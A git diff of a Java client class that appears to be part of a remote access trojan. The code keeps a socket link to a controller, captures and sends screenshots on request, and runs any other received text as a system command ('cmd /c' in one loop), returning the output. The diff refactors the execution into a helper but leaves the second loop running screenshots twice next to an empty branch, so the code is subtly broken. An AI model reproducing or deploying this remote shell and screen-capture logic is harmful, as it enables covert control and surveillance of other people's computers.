@@ -2,7 +2,6 @@ import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
 import java.io.IOException;
 import java.net.Socket;
 import java.util.Objects;
@@ -43,18 +42,12 @@ public class Client {
         while (true) {
             String command = connection.readMessage().getCommand();
 
-            if (Objects.equals(command, "screen")) { // neguin pediu screenshot
-                sendScreenshot();
-            } else {
-                Process process = Runtime.getRuntime().exec("cmd /c" + command);
-                Scanner respostaDoComando = new Scanner(process.getInputStream());
-
-
-                StringBuilder response = new StringBuilder();
-                while (respostaDoComando.hasNext()) {
-                    response.append(respostaDoComando.nextLine() + "\n");
-                }
-                connection.sendMessage(new Message(response.toString()));
+            switch(command) {
+                case "screen":
+                    sendScreenshot();
+                    break;
+                default:
+                    runTerminalCommand("cmd /c" + command);
             }
         }
     }
@@ -64,20 +57,31 @@ public class Client {
         while (true) {
             String command = connection.readMessage().getCommand();
 
+            switch(command) {
+                case "screen":
+                    sendScreenshot();
+                    break;
+                default:
+                    runTerminalCommand(command);
+            }
+
             if (Objects.equals(command, "screen")) { // neguin pediu screenshot
                 sendScreenshot();
             } else {
-                Process proc = Runtime.getRuntime().exec(command);
-                Scanner respostaDoComando = new Scanner(proc.getInputStream());
 
-
-                StringBuilder response = new StringBuilder();
-                while (respostaDoComando.hasNext()) {
-                    response.append(respostaDoComando.nextLine() + "\n");
-                }
-                connection.sendMessage(new Message(response.toString()));
             }
         }
+    }
+
+    private static void runTerminalCommand(String command) throws IOException {
+        Process proc = Runtime.getRuntime().exec(command);
+        Scanner respostaDoComando = new Scanner(proc.getInputStream());
+
+        StringBuilder response = new StringBuilder();
+        while (respostaDoComando.hasNext()) {
+            response.append(respostaDoComando.nextLine() + "\n");
+        }
+        connection.sendMessage(new Message(response.toString()));
     }
 
     private static void sendScreenshot() throws AWTException, IOException {
